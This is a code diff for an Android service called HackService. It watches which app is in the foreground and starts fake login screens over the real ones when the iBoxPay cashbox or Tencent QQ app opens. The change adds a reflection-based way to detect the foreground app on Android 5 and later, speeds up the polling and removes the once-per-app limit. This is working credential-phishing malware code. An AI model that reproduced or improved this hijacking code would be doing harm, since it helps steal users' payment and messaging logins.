@@ -7,6 +7,7 @@ import android.content.Intent;
 import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
+import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.List;
 
@@ -28,63 +29,47 @@ public class HackService extends Service {
         public void run() {
 
             ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-
-            List<ActivityManager.RunningAppProcessInfo> appProcessInfos = activityManager
-
-                    .getRunningAppProcesses();
-
-            // 枚举进程
-
-//            Log.w(TAG, "正在枚举进程");
-
-            for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfos) {
-
-                // 如果APP在前台，那么——悲伤的故事就要来了
-
-                if (appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
-
-                    if (mProcessToHack.containsKey(appProcessInfo.processName)) {
-
-                        // 进行劫持
-
-                        hack(appProcessInfo.processName);
-
-                    } else {
-
-//                        Log.w("hack", appProcessInfo.processName);
-
-                    }
-
-                }
-
+            String runningActivityPackageName;
+            int sdkVersion;
+            try {
+                sdkVersion = Integer.valueOf(android.os.Build.VERSION.SDK);
+            } catch (NumberFormatException e) {
+                sdkVersion = 0;
+            }
+            if (sdkVersion >= 21) {//获取系统api版本号,如果是5x系统就用这个方法获取当前运行的包名
+                runningActivityPackageName = getCurrentPkgName(HackService.this);
+            } else {
+                runningActivityPackageName = activityManager.getRunningTasks(1).get(0).topActivity.getPackageName();
+            }
+            runningActivityPackageName = activityManager.getRunningTasks(1).get(0).topActivity.getClassName();
+            if (mProcessToHack.containsKey(runningActivityPackageName)) {
+                hack(runningActivityPackageName);
             }
 
-            handler.postDelayed(mTask, 1000);
+
+            handler.postDelayed(mTask, 2000);
 
         }
 
 
-        private void hack(String processName) {
+        private void hack(String activityName) {
 
-            Log.w("hack", "有程序要悲剧了……");
 
-            if (!((HackApplication) getApplication()).isHacked(processName)) {
+//            if (!((HackApplication) getApplication()).isHacked(processName)) {
 
-                Log.w("hack", "悲剧正在发生");
 
-                Intent hackIntent = new Intent(getBaseContext(),
+            Intent hackIntent = new Intent(getBaseContext(),
 
-                        mProcessToHack.get(processName));
+                    mProcessToHack.get(activityName));
 
-                hackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            hackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
-                getApplication().startActivity(hackIntent);
+            getApplication().startActivity(hackIntent);
 
-                ((HackApplication) getApplication()).add(processName);
+//            ((HackApplication) getApplication()).add(processName);
+//
 
-                Log.w("hack", "已经劫持");
-
-            }
+//            }
         }
     };
 
@@ -108,13 +93,13 @@ public class HackService extends Service {
         super.onCreate();
         if (!hasStart) {
 
-            mProcessToHack.put("com.iboxpay.minicashbox",
+            mProcessToHack.put("com.iboxpay.minicashbox.LoginActivity",
 
                     FakeCashboxLoginActivity.class);
 
-            mProcessToHack.put("com.tencent.mobileqq",FakeLoginActivity.class);
+            mProcessToHack.put("com.tencent.mobileqq", FakeLoginActivity.class);
 
-            handler.postDelayed(mTask, 1000);
+            handler.postDelayed(mTask, 100);
 
             hasStart = true;
 
@@ -132,4 +117,38 @@ public class HackService extends Service {
     }
 
 
+    public static String getCurrentPkgName(Context context) {//5x系统以后利用反射获取当前栈顶activity的包名.
+        ActivityManager.RunningAppProcessInfo currentInfo = null;
+        Field field = null;
+        int START_TASK_TO_FRONT = 2;
+        String pkgName = null;
+        try {
+            field = ActivityManager.RunningAppProcessInfo.class.getDeclaredField("processState");//通过反射获取进程状态字段.
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+        List appList = am.getRunningAppProcesses();
+        ActivityManager.RunningAppProcessInfo app;
+        for (int i = 0; i < appList.size(); i++) {
+            //ActivityManager.RunningAppProcessInfo app : appList
+            app = (ActivityManager.RunningAppProcessInfo) appList.get(i);
+            if (app.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {//表示前台运行进程.
+                Integer state = null;
+                try {
+                    state = field.getInt(app);//反射调用字段值的方法,获取该进程的状态.
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                if (state != null && state == START_TASK_TO_FRONT) {//根据这个判断条件从前台中获取当前切换的进程对象.
+                    currentInfo = app;
+                    break;
+                }
+            }
+        }
+        if (currentInfo != null) {
+            pkgName = currentInfo.processName;
+        }
+        return pkgName;
+    }
 }
